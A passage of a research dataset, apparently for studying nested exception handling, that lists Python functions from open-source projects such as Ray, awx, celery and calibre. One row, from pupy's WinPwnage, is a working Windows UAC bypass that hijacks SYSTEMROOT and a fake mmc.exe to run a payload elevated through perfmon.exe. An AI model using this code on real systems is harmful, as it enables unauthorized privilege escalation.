                            ""Job entrypoint command ""
                            f""failed with exit code {return_code}. No logs available.""
                        )
                    await self._job_info_client.put_status(
                        self._job_id,
                        JobStatus.FAILED,
                        message=message,
                        driver_exit_code=return_code,
                    )
        except Exception:
            logger.error(
                ""Got unexpected exception while trying to execute driver ""
                f""command. {traceback.format_exc()}""
            )
            try:
                await self._job_info_client.put_status(
                    self._job_id,
                    JobStatus.FAILED,
                    message=traceback.format_exc(),
                )
            except Exception:
                logger.error(
                    ""Failed to update job status to FAILED. ""
                    f""Exception: {traceback.format_exc()}""
                )
        finally:
            # clean up actor after tasks are finished
            ray.actor.exit_actor()",Nested Try-Except Blocks,1
215,yolov3,/home/r4ph/desenv/phd/exception-miner/projects/py/yolov3/utils/downloads.py,attempt_download,"def attempt_download(file, repo='ultralytics/yolov5', release='v7.0'):
    # Attempt file download from GitHub release assets if not found locally. release = 'latest', 'v7.0', etc.
    from utils.general import LOGGER

    def github_assets(repository, version='latest'):
        # Return GitHub repo tag (i.e. 'v7.0') and assets (i.e. ['yolov5s.pt', 'yolov5m.pt', ...])
        if version != 'latest':
            version = f'tags/{version}'  # i.e. tags/v7.0
        response = requests.get(f'https://api.github.com/repos/{repository}/releases/{version}').json()  # github api
        return response['tag_name'], [x['name'] for x in response['assets']]  # tag, assets

    file = Path(str(file).strip().replace(""'"", ''))
    if not file.exists():
        # URL specified
        name = Path(urllib.parse.unquote(str(file))).name  # decode '%2F' to '/' etc.
        if str(file).startswith(('http:/', 'https:/')):  # download
            url = str(file).replace(':/', '://')  # Pathlib turns :// -> :/
            file = name.split('?')[0]  # parse authentication https://url.com/file.txt?auth...
            if Path(file).is_file():
                LOGGER.info(f'Found {url} locally at {file}')  # file already exists
            else:
                safe_download(file=file, url=url, min_bytes=1E5)
            return file

        # GitHub assets
        assets = [f'yolov5{size}{suffix}.pt' for size in 'nsmlx' for suffix in ('', '6', '-cls', '-seg')]  # default
        try:
            tag, assets = github_assets(repo, release)
        except Exception:
            try:
                tag, assets = github_assets(repo)  # latest release
            except Exception:
                try:
                    tag = subprocess.check_output('git tag', shell=True, stderr=subprocess.STDOUT).decode().split()[-1]
                except Exception:
                    tag = release

        if name in assets:
            file.parent.mkdir(parents=True, exist_ok=True)  # make parent dir (if required)
            safe_download(file,
                          url=f'https://github.com/{repo}/releases/download/{tag}/{name}',
                          min_bytes=1E5,
                          error_msg=f'{file} missing, try downloading from https://github.com/{repo}/releases/{tag}')

    return str(file)",Nested Try-Except Blocks,1
216,pupy,/home/r4ph/desenv/phd/exception-miner/projects/py/pupy/pupy/external/WinPwnage/winpwnage/functions/uac/uac_perfmon.py,perfmon,"def perfmon(payload):
	if payloads().exe(payload):
		try:
			key = _winreg.CreateKey(_winreg.HKEY_CURRENT_USER,os.path.join(""Volatile Environment""))
			_winreg.SetValueEx(key, ""SYSTEMROOT"", 0, _winreg.REG_SZ,tempfile.gettempdir())
			_winreg.CloseKey(key)
		except Exception as error:
			print_error(""Unable to create registry keys, exception was raised: {}"".format(error))
			return False
		else:
			print_success(""Successfully created SYSTEMROOT key containing a new temp directory ({})"".format(
				os.path.join(tempfile.gettempdir())))

		try:
			if os.path.exists(os.path.join(tempfile.gettempdir(), ""system32"")):
				if os.path.isfile(os.path.join(tempfile.gettempdir(), ""system32\\mmc.exe"")):
					try:
						os.remove(os.path.join(tempfile.gettempdir(), ""system32\\mmc.exe""))
					except Exception as error:
						return False
					try:
						os.rmdir(os.path.join(tempfile.gettempdir(), ""system32""))
					except Exception as error:
						return False
				else:
					try:
						os.rmdir(os.path.join(tempfile.gettempdir(), ""system32""))
					except Exception as error:
						return False
			else:
				pass
		except Exception as error:
			return False

		try:
			os.makedirs(os.path.join(tempfile.gettempdir(), ""system32""))
		except Exception as error:
			return False

		time.sleep(5)

		try:
			if not os.path.exists(payload):
				print_error('Args are not allowed with this technique.')
				return False

			shutil.copy(payload, os.path.join(tempfile.gettempdir(), ""system32\\mmc.exe""))
		except shutil.Error as error:
			return False
		except IOError as error:
			return False

		time.sleep(5)

		print_info(""Disabling file system redirection"")
		with disable_fsr():
			print_success(""Successfully disabled file system redirection"")
			if process().create(""perfmon.exe""):
				print_success(""Successfully spawned process ({})"".format(payload))
			else:
				print_error(""Unable to spawn process ({})"".format(os.path.join(payload)))
		
		time.sleep(5)
		
		try:
			key = _winreg.CreateKey(_winreg.HKEY_CURRENT_USER, os.path.join(""Volatile Environment""))
			_winreg.DeleteValue(key, ""SYSTEMROOT"")
		except Exception as error:
			print_error(""Unable to cleanup"")
			return False
		else:
			print_success(""Successfully cleaned up, enjoy!"")
	else:
		print_error(""Cannot proceed, invalid payload"")
		return False",Nested Try-Except Blocks,1
217,awx,/home/r4ph/desenv/phd/exception-miner/projects/py/awx/awx_collection/plugins/module_utils/controller_api.py,load_config,"def load_config(self, config_path):
        # Validate the config file is an actual file
        if not isfile(config_path):
            raise ConfigFileException('The specified config file does not exist')

        if not access(config_path, R_OK):
            raise ConfigFileException(""The specified config file cannot be read"")

        # Read in the file contents:
        with open(config_path, 'r') as f:
            config_string = f.read()

        # First try to yaml load the content (which will also load json)
        try:
            try_config_parsing = True
            if HAS_YAML:
                try:
                    config_data = yaml.load(config_string, Loader=yaml.SafeLoader)
                    # If this is an actual ini file, yaml will return the whole thing as a string instead of a dict
                    if type(config_data) is not dict:
                        raise AssertionError(""The yaml config file is not properly formatted as a dict."")
                    try_config_parsing = False

                except (AttributeError, yaml.YAMLError, AssertionError):
                    try_config_parsing = True

            if try_config_parsing:
                # TowerCLI used to support a config file with a missing [general] section by prepending it if missing
                if '[general]' not in config_string:
                    config_string = '[general]\n{0}'.format(config_string)

                config = ConfigParser()

                try:
                    placeholder_file = StringIO(config_string)
                    # py2 ConfigParser has readfp, that has been deprecated in favor of read_file in py3
                    # This ""if"" removes the deprecation warning
                    if hasattr(config, 'read_file'):
                        config.read_file(placeholder_file)
                    else:
                        config.readfp(placeholder_file)

                    # If we made it here then we have values from reading the ini file, so let's pull them out into a dict
                    config_data = {}
                    for honorred_setting in self.short_params:
                        try:
                            config_data[honorred_setting] = config.get('general', honorred_setting)
                        except NoOptionError:
                            pass

                except Exception as e:
                    raise_from(ConfigFileException(""An unknown exception occured trying to ini load config file: {0}"".format(e)), e)

        except Exception as e:
            raise_from(ConfigFileException(""An unknown exception occured trying to load config file: {0}"".format(e)), e)

        # If we made it here, we have a dict which has values in it from our config, any final settings logic can be performed here
        for honorred_setting in self.short_params:
            if honorred_setting in config_data:
                # Veriffy SSL must be a boolean
                if honorred_setting == 'verify_ssl':
                    if type(config_data[honorred_setting]) is str:
                        setattr(self, honorred_setting, strtobool(config_data[honorred_setting]))
                    else:
                        setattr(self, honorred_setting, bool(config_data[honorred_setting]))
                else:
                    setattr(self, honorred_setting, config_data[honorred_setting])",Nested Try-Except Blocks,1
218,celery,/home/r4ph/desenv/exception-miner/projects/py/celery/celery/utils/threads.py,run,"def run(self):
        body = self.body
        shutdown_set = self.__is_shutdown.is_set
        try:
            while not shutdown_set():
                try:
                    body()
                except Exception as exc:  # pylint: disable=broad-except
                    try:
                        self.on_crash('{0!r} crashed: {1!r}', self.name, exc)
                        self._set_stopped()
                    finally:
                        sys.stderr.flush()
                        os._exit(1)  # exiting by normal means won't work
        finally:
            self._set_stopped()",Nested Try-Except Blocks,1
219,spyder,/home/r4ph/desenv/phd/exception-miner/projects/py/spyder/spyder/plugins/findinfiles/widgets/search_thread.py,find_string_in_file,"def find_string_in_file(self, fname):
        self.error_flag = False
        self.sig_current_file.emit(fname)
        try:
            for lineno, line in enumerate(open(fname, 'rb')):
                for text, enc in self.texts:
                    with QMutexLocker(self.mutex):
                        if self.stopped:
                            return False
                    line_search = line
                    if not self.case_sensitive:
                        line_search = line_search.lower()
                    if self.text_re:
                        found = re.search(text, line_search)
                        if found is not None:
                            break
                    else:
                        found = line_search.find(text)
                        if found > -1:
                            break
                try:
                    line_dec = line.decode(enc)
                except UnicodeDecodeError:
                    line_dec = line

                if not self.case_sensitive:
                    line = line.lower()

                if self.text_re:
                    for match in re.finditer(text, line):
                        with QMutexLocker(self.mutex):
                            if self.stopped:
                                return False
                        self.total_matches += 1
                        bstart, bend = match.start(), match.end()
                        try:
                            # Go from binary position to utf8 position
                            start = len(line[:bstart].decode(enc))
                            end = start + len(line[bstart:bend].decode(enc))
                        except UnicodeDecodeError:
                            start = bstart
                            end = bend
                        self.partial_results.append((osp.abspath(fname),
                                                     lineno + 1,
                                                     start,
                                                     end,
                                                     line_dec))
                        if len(self.partial_results) > (2**self.power):
                            self.process_results()
                            if self.power < self.max_power:
                                self.power += 1
                else:
                    found = line.find(text)
                    while found > -1:
                        with QMutexLocker(self.mutex):
                            if self.stopped:
                                return False
                        self.total_matches += 1
                        try:
                            # Go from binary position to utf8 position
                            start = len(line[:found].decode(enc))
                            end = start + len(text.decode(enc))
                        except UnicodeDecodeError:
                            start = found
                            end = found + len(text)

                        self.partial_results.append((osp.abspath(fname),
                                                     lineno + 1,
                                                     start,
                                                     end,
                                                     line_dec))
                        if len(self.partial_results) > (2**self.power):
                            self.process_results()
                            if self.power < self.max_power:
                                self.power += 1

                        for text, enc in self.texts:
                            found = line.find(text, found + 1)
                            if found > -1:
                                break
        except IOError as xxx_todo_changeme:
            (_errno, _strerror) = xxx_todo_changeme.args
            self.error_flag = _(""permission denied errors were encountered"")

        # Process any pending results
        if self.is_file and self.partial_results:
            self.process_results()

        self.completed = True",Nested Try-Except Blocks,1
220,activitywatch,/home/r4ph/desenv/phd/exception-miner/projects/py/activitywatch/aw-watcher-window/aw_watcher_window/main.py,heartbeat_loop,"def heartbeat_loop(client, bucket_id, poll_time, strategy, exclude_title=False):
    while True:
        if os.getppid() == 1:
            logger.info(""window-watcher stopped because parent process died"")
            break

        current_window = None
        try:
            current_window = get_current_window(strategy)
            logger.debug(current_window)
        except (FatalError, OSError):
            # Fatal exceptions should quit the program
            try:
                logger.exception(""Fatal error, stopping"")
            except OSError:
                pass
            break
        except Exception:
            # Non-fatal exceptions should be logged
            try:
                # If stdout has been closed, this exception-print can cause (I think)
                #   OSError: [Errno 5] Input/output error
                # See: https://github.com/ActivityWatch/activitywatch/issues/756#issue-1296352264
                #
                # However, I'm unable to reproduce the OSError in a test (where I close stdout before logging),
                # so I'm in uncharted waters here... but this solution should work.
                logger.exception(""Exception thrown while trying to get active window"")
            except OSError:
                break

        if current_window is None:
            logger.debug(""Unable to fetch window, trying again on next poll"")
        else:
            if exclude_title:
                current_window[""title""] = ""excluded""

            now = datetime.now(timezone.utc)
            current_window_event = Event(timestamp=now, data=current_window)

            # Set pulsetime to 1 second more than the poll_time
            # This since the loop takes more time than poll_time
            # due to sleep(poll_time).
            client.heartbeat(
                bucket_id, current_window_event, pulsetime=poll_time + 1.0, queued=True
            )

        sleep(poll_time)",Nested Try-Except Blocks,1
221,instapy,/home/r4ph/desenv/phd/exception-miner/projects/py/instapy/instapy/unfollow_util.py,get_given_user_following,"def get_given_user_following(
    browser,
    login,
    user_name,
    amount,
    dont_include,
    randomize,
    blacklist,
    follow_times,
    simulation,
    jumps,
    logger,
    logfolder,
):
    """"""
    For the given username, follow who they follows.

    :param browser: webdriver instance
    :param login:
    :param user_name: given username of account to follow
    :param amount: the number of followers to follow
    :param dont_include: ignore these usernames
    :param randomize: randomly select from users' followers
    :param blacklist:
    :param follow_times:
    :param logger: the logger instance
    :param logfolder: the logger folder
    :return: list of user's following
    """"""
    user_name = user_name.strip().lower()

    user_link = ""https://www.instagram.com/{}/"".format(user_name)
    web_address_navigator(browser, user_link)

    if not is_page_available(browser, logger):
        return [], []

    #  check how many people are following this user.
    #  throw RuntimeWarning if we are 0 people following this user
    try:
        # allfollowing = format_number(
        #    browser.find_element(By.XPATH, read_xpath(get_given_user_following.__name__,""all_following"")).text)
        allfollowing = format_number(
            browser.find_element(
                By.XPATH, read_xpath(get_given_user_following.__name__, ""all_following"")
            ).text
        )

    except NoSuchElementException:
        try:
            allfollowing = browser.execute_script(
                ""return window.__additionalData[Object.keys(window.__additionalData)[0]].data.""
                ""graphql.user.edge_follow.count""
            )

        except WebDriverException:
            try:
                browser.execute_script(""location.reload()"")
                update_activity(browser, state=None)

                allfollowing = browser.execute_script(
                    ""return window._sharedData.""
                    ""entry_data.ProfilePage[0].""
                    ""graphql.user.edge_follow.count""
                )

            except WebDriverException:
                try:
                    topCount_elements = browser.find_elements(
                        By.XPATH,
                        read_xpath(
                            get_given_user_following.__name__, ""topCount_elements""
                        ),
                    )

                    if topCount_elements:
                        allfollowing = format_number(topCount_elements[2].text)
                    else:
                        logger.info(
                            ""Failed to get following count of '{}'  ~empty ""
                            ""list"".format(user_name)
                        )
                        allfollowing = None

                except (NoSuchElementException, IndexError):
                    logger.error(
                        ""\nError occured during getting the following count ""
                        ""of '{}'\n"".format(user_name)
                    )
                    return [], []

    # skip early for no followers
    if not allfollowing:
        logger.info(""'{}' has no any following"".format(user_name))
        return [], []

    elif allfollowing < amount:
        logger.warning(
            ""'{}' has less following- {} than the desired amount of {}"".format(
                user_name, allfollowing, amount
            )
        )

    try:
        following_link = browser.find_elements(
            By.XPATH,
            read_xpath(get_given_user_following.__name__, ""following_link"").format(
                user_name
            ),
        )
        click_element(browser, following_link[0])
        # update server calls
        update_activity(browser, state=None)

    except NoSuchElementException:
        logger.error(""Could not find following's link for '{}'"".format(user_name))
        return [], []

    except BaseException as e:
        logger.error(""`following_link` error {}"".format(str(e)))
        return [], []

    channel = ""Follow""
    edge_followed_by = False
    person_list, simulated_list = get_users_through_dialog_with_graphql(
        browser,
        login,
        user_name,
        amount,
        allfollowing,
        randomize,
        dont_include,
        blacklist,
        follow_times,
        simulation,
        channel,
        jumps,
        logger,
        logfolder,
        edge_followed_by,
    )

    return person_list, simulated_list",Nested Try-Except Blocks,1
222,localstack,/home/r4ph/desenv/exception-miner/projects/py/localstack/localstack/utils/json.py,parse_json_or_yaml,"def parse_json_or_yaml(markup: str) -> Any:
    import yaml  # leave import here, to avoid breaking our Lambda tests!

    try:
        return json.loads(markup)
    except Exception:
        try:
            return clone_safe(yaml.safe_load(markup))
        except Exception:
            try:
                return clone_safe(yaml.load(markup, Loader=yaml.SafeLoader))
            except Exception:
                raise",Nested Try-Except Blocks,1
223,calibre,/home/r4ph/desenv/phd/exception-miner/projects/py/calibre/src/calibre/devices/kobo/driver.py,books,"def books(self, oncard=None, end_session=True):
        debug_print(""KoboTouch:books - oncard='%s'""%oncard)
        self.debugging_title = self.get_debugging_title()

        dummy_bl = self.booklist_class(None, None, None)

        if oncard == 'carda' and not self._card_a_prefix:
            self.report_progress(1.0, _('Getting list of books on device...'))
            debug_print(""KoboTouch:books - Asked to process 'carda', but do not have one!"")
            return dummy_bl
        elif oncard == 'cardb' and not self._card_b_prefix:
            self.report_progress(1.0, _('Getting list of books on device...'))
            debug_print(""KoboTouch:books - Asked to process 'cardb', but do not have one!"")
            return dummy_bl
        elif oncard and oncard != 'carda' and oncard != 'cardb':
            self.report_progress(1.0, _('Getting list of books on device...'))
            debug_print(""KoboTouch:books - unknown card"")
            return dummy_bl

        prefix = self._card_a_prefix if oncard == 'carda' else \
                 self._card_b_prefix if oncard == 'cardb' \
                 else self._main_prefix
        debug_print(""KoboTouch:books - oncard='%s', prefix='%s'""%(oncard, prefix))

        self.fwversion = self.get_firmware_version()

        debug_print('Kobo device: %s' % self.gui_name)
        debug_print('Version of driver:', self.version, 'Has kepubs:', self.has_kepubs)
        debug_print('Version of firmware:', self.fwversion, 'Has kepubs:', self.has_kepubs)
        debug_print('Firmware supports cover image tree:', self.fwversion >= self.min_fwversion_images_tree)

        self.booklist_class.rebuild_collections = self.rebuild_collections

        # get the metadata cache
        bl = self.booklist_class(oncard, prefix, self.settings)

        opts = self.settings()
        debug_print(""KoboTouch:books - opts.extra_customization="", opts.extra_customization)
        debug_print(""KoboTouch:books - driver options="", self)
        debug_print(""KoboTouch:books - prefs['manage_device_metadata']="", prefs['manage_device_metadata'])
        debugging_title = self.debugging_title
        debug_print(""KoboTouch:books - set_debugging_title to '%s'"" % debugging_title)
        bl.set_debugging_title(debugging_title)
        debug_print(""KoboTouch:books - length bl=%d""%len(bl))
        need_sync = self.parse_metadata_cache(bl, prefix, self.METADATA_CACHE)
        debug_print(""KoboTouch:books - length bl after sync=%d""%len(bl))

        # make a dict cache of paths so the lookup in the loop below is faster.
        bl_cache = {}
        for idx,b in enumerate(bl):
            bl_cache[b.lpath] = idx

        def update_booklist(prefix, path, ContentID, ContentType, MimeType, ImageID,
                            title, authors, DateCreated, Description, Publisher,
                            series, seriesnumber, SeriesID, SeriesNumberFloat,
                            ISBN, Language, Subtitle,
                            readstatus, expired, favouritesindex, accessibility, isdownloaded,
                            userid, bookshelves, book_stats=None
                            ):
            show_debug = self.is_debugging_title(title)
#            show_debug = authors == 'L. Frank Baum'
            if show_debug:
                debug_print(""KoboTouch:update_booklist - title='%s'""%title, ""ContentType=%s""%ContentType, ""isdownloaded="", isdownloaded)
                debug_print(
                    ""         prefix=%s, DateCreated=%s, readstatus=%d, MimeType=%s, expired=%d, favouritesindex=%d, accessibility=%d, isdownloaded=%s""%
                (prefix, DateCreated, readstatus, MimeType, expired, favouritesindex, accessibility, isdownloaded,))
            changed = False
            try:
                lpath = path.partition(self.normalize_path(prefix))[2]
                if lpath.startswith(os.sep):
                    lpath = lpath[len(os.sep):]
                lpath = lpath.replace('\\', '/')
#                 debug_print(""KoboTouch:update_booklist - LPATH: "", lpath, ""  - Title:  "" , title)

                playlist_map = {}

                if lpath not in playlist_map:
                    playlist_map[lpath] = []

                allow_shelves = True
                if readstatus == 1:
                    playlist_map[lpath].append('Im_Reading')
                elif readstatus == 2:
                    playlist_map[lpath].append('Read')
                elif readstatus == 3:
                    playlist_map[lpath].append('Closed')

                # Related to a bug in the Kobo firmware that leaves an expired row for deleted books
                # this shows an expired Collection so the user can decide to delete the book
                if expired == 3:
                    playlist_map[lpath].append('Expired')
                    allow_shelves = False
                # A SHORTLIST is supported on the touch but the data field is there on most earlier models
                if favouritesindex == 1:
                    playlist_map[lpath].append('Shortlist')

                # Audiobooks are identified by their MimeType
                if MimeType in self.KOBO_AUDIOBOOKS_MIMETYPES:
                    playlist_map[lpath].append('Audiobook')

                # The following is in flux:
                # - FW2.0.0, DBVersion 53,55 accessibility == 1
                # - FW2.1.2 beta, DBVersion == 56, accessibility == -1:
                # So, the following should be OK
                if isdownloaded == 'false':
                    if self.dbversion < 56 and accessibility <= 1 or self.dbversion >= 56 and accessibility == -1:
                        playlist_map[lpath].append('Deleted')
                        allow_shelves = False
                        if show_debug:
                            debug_print(""KoboTouch:update_booklist - have a deleted book"")
                    elif self.supports_kobo_archive() and (accessibility == 1 or accessibility == 2):
                        playlist_map[lpath].append('Archived')
                        allow_shelves = True

                # Label Previews and Recommendations
                if accessibility == 6:
                    if userid == '':
                        playlist_map[lpath].append('Recommendation')
                        allow_shelves = False
                    else:
                        playlist_map[lpath].append('Preview')
                        allow_shelves = False
                elif accessibility == 4:        # Pre 2.x.x firmware
                    playlist_map[lpath].append('Recommendation')
                    allow_shelves = False
                elif accessibility == 8:        # From 4.22 but waa probably there earlier.
                    playlist_map[lpath].append('Kobo Plus')
                    allow_shelves = True
                elif accessibility == 9:        # From 4.0 on Aura One
                    playlist_map[lpath].append('OverDrive')
                    allow_shelves = True

                kobo_collections = playlist_map[lpath][:]

                if allow_shelves:
                    #                    debug_print('KoboTouch:update_booklist - allowing shelves - title=%s' % title)
                    if len(bookshelves) > 0:
                        playlist_map[lpath].extend(bookshelves)

                if show_debug:
                    debug_print('KoboTouch:update_booklist - playlist_map=', playlist_map)

                path = self.normalize_path(path)
                # print ""Normalized FileName: "" + path

                # Collect the Kobo metadata
                authors_list = [a.strip() for a in authors.split(""&"")] if authors is not None else [_('Unknown')]
                kobo_metadata = Metadata(title, authors_list)
                kobo_metadata.series       = series
                kobo_metadata.series_index = seriesnumber
                kobo_metadata.comments     = Description
                kobo_metadata.publisher    = Publisher
                kobo_metadata.language     = Language
                kobo_metadata.isbn         = ISBN
                if DateCreated is not None:
                    try:
                        kobo_metadata.pubdate     = parse_date(DateCreated, assume_utc=True)
                    except:
                        try:
                            kobo_metadata.pubdate = datetime.strptime(DateCreated, ""%Y-%m-%dT%H:%M:%S.%fZ"")
                        except:
                            debug_print(""KoboTouch:update_booklist - Cannot convert date - DateCreated='%s'""%DateCreated)

                idx = bl_cache.get(lpath, None)
                if idx is not None:  # and not (accessibility == 1 and isdownloaded == 'false'):
                    if show_debug:
                        self.debug_index = idx
                        debug_print(""KoboTouch:update_booklist - idx=%d""%idx)
                        debug_print(""KoboTouch:update_booklist - lpath=%s""%lpath)
                        debug_print('KoboTouch:update_booklist - bl[idx].device_collections=', bl[idx].device_collections)
                        debug_print('KoboTouch:update_booklist - playlist_map=', playlist_map)
                        debug_print('KoboTouch:update_booklist - bookshelves=', bookshelves)
                        debug_print('KoboTouch:update_booklist - kobo_collections=', kobo_collections)
                        debug_print('KoboTouch:update_booklist - series=""%s""' % bl[idx].series)
                        debug_print('KoboTouch:update_booklist - the book=', bl[idx])
                        debug_print('KoboTouch:update_booklist - the authors=', bl[idx].authors)
                        debug_print('KoboTouch:update_booklist - application_id=', bl[idx].application_id)
                        debug_print('KoboTouch:update_booklist - size=', bl[idx].size)
                    bl_cache[lpath] = None

                    if ImageID is not None:
                        imagename = self.imagefilename_from_imageID(prefix, ImageID)
                        if imagename is not None:
                            bl[idx].thumbnail = ImageWrapper(imagename)
                    if (ContentType == '6' and MimeType != 'application/x-kobo-epub+zip'):
                        if os.path.exists(self.normalize_path(os.path.join(prefix, lpath))):
                            if self.update_metadata_item(bl[idx]):
                                # debug_print(""KoboTouch:update_booklist - update_metadata_item returned true"")
                                changed = True
                        else:
                            debug_print(""    Strange:  The file: "", prefix, lpath, "" does not exist!"")
                            debug_print(""KoboTouch:update_booklist - book size="", bl[idx].size)

                    if show_debug:
                        debug_print(""KoboTouch:update_booklist - ContentID='%s'""%ContentID)
                    bl[idx].contentID           = ContentID
                    bl[idx].kobo_metadata       = kobo_metadata
                    bl[idx].kobo_series         = series
                    bl[idx].kobo_series_number  = seriesnumber
                    bl[idx].kobo_series_id      = SeriesID
                    bl[idx].kobo_series_number_float = SeriesNumberFloat
                    bl[idx].kobo_subtitle       = Subtitle
                    bl[idx].kobo_bookstats      = book_stats
                    bl[idx].can_put_on_shelves  = allow_shelves
                    bl[idx].mime                = MimeType

                    if not bl[idx].is_sideloaded and bl[idx].has_kobo_series and SeriesID is not None:
                        if show_debug:
                            debug_print('KoboTouch:update_booklist - Have purchased kepub with series, saving SeriesID=', SeriesID)
                        self.kobo_series_dict[series] = SeriesID

                    if lpath in playlist_map:
                        bl[idx].device_collections  = playlist_map.get(lpath,[])
                        bl[idx].current_shelves     = bookshelves
                        bl[idx].kobo_collections    = kobo_collections

                    if show_debug:
                        debug_print('KoboTouch:update_booklist - updated bl[idx].device_collections=', bl[idx].device_collections)
                        debug_print('KoboTouch:update_booklist - playlist_map=', playlist_map, 'changed=', changed)
#                        debug_print('KoboTouch:update_booklist - book=', bl[idx])
                        debug_print(""KoboTouch:update_booklist - book class=%s""%bl[idx].__class__)
                        debug_print(""KoboTouch:update_booklist - book title=%s""%bl[idx].title)
                else:
                    if show_debug:
                        debug_print('KoboTouch:update_booklist - idx is none')
                    try:
                        if os.path.exists(self.normalize_path(os.path.join(prefix, lpath))):
                            book = self.book_from_path(prefix, lpath, title, authors, MimeType, DateCreated, ContentType, ImageID)
                        else:
                            if isdownloaded == 'true':  # A recommendation or preview is OK to not have a file
                                debug_print(""    Strange:  The file: "", prefix, lpath, "" does not exist!"")
                                title = ""FILE MISSING: "" + title
                            book =  self.book_class(prefix, lpath, title, authors, MimeType, DateCreated, ContentType, ImageID, size=0)
                            if show_debug:
                                debug_print('KoboTouch:update_booklist - book file does not exist. ContentID=""%s""'%ContentID)

                    except Exception as e:
                        debug_print(""KoboTouch:update_booklist - exception creating book: '%s'""%str(e))
                        debug_print(""        prefix: "", prefix, ""lpath: "", lpath, ""title: "", title, ""authors: "", authors,
                                    ""MimeType: "", MimeType, ""DateCreated: "", DateCreated, ""ContentType: "", ContentType, ""ImageID: "", ImageID)
                        raise

                    if show_debug:
                        debug_print('KoboTouch:update_booklist - class:', book.__class__)
#                        debug_print('    resolution:', book.__class__.__mro__)
                        debug_print(""    contentid: '%s'""%book.contentID)
                        debug_print(""    title:'%s'""%book.title)
                        debug_print(""    the book:"", book)
                        debug_print(""    author_sort:'%s'""%book.author_sort)
                        debug_print(""    bookshelves:"", bookshelves)
                        debug_print(""    kobo_collections:"", kobo_collections)

                    # print 'Update booklist'
                    book.device_collections = playlist_map.get(lpath,[])  # if lpath in playlist_map else []
                    book.current_shelves    = bookshelves
                    book.kobo_collections   = kobo_collections
                    book.contentID          = ContentID
                    book.kobo_metadata      = kobo_metadata
                    book.kobo_series        = series
                    book.kobo_series_number = seriesnumber
                    book.kobo_series_id     = SeriesID
                    book.kobo_series_number_float = SeriesNumberFloat
                    book.kobo_subtitle      = Subtitle
                    book.kobo_bookstats     = book_stats
                    book.can_put_on_shelves = allow_shelves
#                    debug_print('KoboTouch:update_booklist - title=', title, 'book.device_collections', book.device_collections)

                    if not book.is_sideloaded and book.has_kobo_series and SeriesID is not None:
                        if show_debug:
                            debug_print('KoboTouch:update_booklist - Have purchased kepub with series, saving SeriesID=', SeriesID)
                        self.kobo_series_dict[series] = SeriesID

                    if bl.add_book(book, replace_metadata=False):
                        changed = True
                    if show_debug:
                        debug_print('        book.device_collections', book.device_collections)
                        debug_print('        book.title', book.title)
            except:  # Probably a path encoding error
                import traceback
                traceback.print_exc()
            return changed

        def get_bookshelvesforbook(connection, ContentID):
            #            debug_print(""KoboTouch:get_bookshelvesforbook - "" + ContentID)
            bookshelves = []
            if not self.supports_bookshelves:
                return bookshelves

            cursor = connection.cursor()
            query = ""select ShelfName ""         \
                    ""from ShelfContent ""        \
                    ""where ContentId = ? ""      \
                    ""and _IsDeleted = 'false' "" \
                    ""and ShelfName is not null""         # This should never be null, but it is protection against an error cause by a sync to the Kobo server
            values = (ContentID, )
            cursor.execute(query, values)
            for i, row in enumerate(cursor):
                bookshelves.append(row['ShelfName'])

            cursor.close()
#            debug_print(""KoboTouch:get_bookshelvesforbook - count bookshelves="" + str(count_bookshelves))
            return bookshelves

        self.debug_index = 0

        with closing(self.device_database_connection(use_row_factory=True)) as connection:
            debug_print(""KoboTouch:books - reading device database"")

            self.dbversion = self.get_database_version(connection)
            debug_print(""Database Version: "", self.dbversion)

            self.bookshelvelist = self.get_bookshelflist(connection)
            debug_print(""KoboTouch:books - shelf list:"", self.bookshelvelist)

            columns = 'Title, Attribution, DateCreated, ContentID, MimeType, ContentType, ImageId, ReadStatus, Description, Publisher '
            if self.dbversion >= 16:
                columns += ', ___ExpirationStatus, FavouritesIndex, Accessibility'
            else:
                columns += ', -1 as ___ExpirationStatus, -1 as FavouritesIndex, -1 as Accessibility'
            if self.dbversion >= 33:
                columns += ', Language, IsDownloaded'
            else:
                columns += ', NULL AS Language, ""1"" AS IsDownloaded'
            if self.dbversion >= 46:
                columns += ', ISBN'
            else:
                columns += ', NULL AS ISBN'
            if self.supports_series():
                columns += "", Series, SeriesNumber, ___UserID, ExternalId, Subtitle""
            else:
                columns += ', null as Series, null as SeriesNumber, ___UserID, null as ExternalId, null as Subtitle'
            if self.supports_series_list:
                columns += "", SeriesID, SeriesNumberFloat""
            else:
                columns += ', null as SeriesID, null as SeriesNumberFloat'
            if self.supports_bookstats:
                columns += "", StorePages, StoreWordCount, StoreTimeToReadLowerEstimate, StoreTimeToReadUpperEstimate""
            else:
                columns += ', null as StorePages, null as StoreWordCount, null as StoreTimeToReadLowerEstimate, null as StoreTimeToReadUpperEstimate'

            where_clause = ''
            if self.supports_kobo_archive() or self.supports_overdrive():
                where_clause = ("" WHERE BookID IS NULL ""
                        "" AND ((Accessibility = -1 AND IsDownloaded in ('true', 1 )) ""              # Sideloaded books
                        ""      OR (Accessibility IN (%(downloaded_accessibility)s) %(expiry)s) ""    # Purchased books
                        ""      %(previews)s %(recommendations)s ) ""                                  # Previews or Recommendations
                    ) % \
                    dict(
                         expiry="""" if self.show_archived_books else ""and IsDownloaded in ('true', 1)"",
                         previews="" OR (Accessibility in (6) AND ___UserID <> '')"" if self.show_previews else """",
                         recommendations="" OR (Accessibility IN (-1, 4, 6) AND ___UserId = '')"" if self.show_recommendations else """",
                         downloaded_accessibility=""1,2,8,9"" if self.supports_overdrive() else ""1,2""
                         )
            elif self.supports_series():
                where_clause = ("" WHERE BookID IS NULL ""
                    "" AND ((Accessibility = -1 AND IsDownloaded IN ('true', 1)) or (Accessibility IN (1,2)) %(previews)s %(recommendations)s )""
                    "" AND NOT ((___ExpirationStatus=3 OR ___ExpirationStatus is Null) %(expiry)s)""
                    ) % \
                    dict(
                         expiry="" AND ContentType = 6"" if self.show_archived_books else """",
                         previews="" or (Accessibility IN (6) AND ___UserID <> '')"" if self.show_previews else """",
                         recommendations="" or (Accessibility in (-1, 4, 6) AND ___UserId = '')"" if self.show_recommendations else """"
                         )
            elif self.dbversion >= 33:
                where_clause = (' WHERE BookID IS NULL %(previews)s %(recommendations)s AND NOT'
                    ' ((___ExpirationStatus=3 or ___ExpirationStatus IS NULL) %(expiry)s)'
                    ) % \
                    dict(
                         expiry=' AND ContentType = 6' if self.show_archived_books else '',
                         previews=' AND Accessibility <> 6' if not self.show_previews else '',
                         recommendations=' AND IsDownloaded IN (\'true\', 1)' if not self.show_recommendations else ''
                         )
            elif self.dbversion >= 16:
                where_clause = (' WHERE BookID IS NULL '
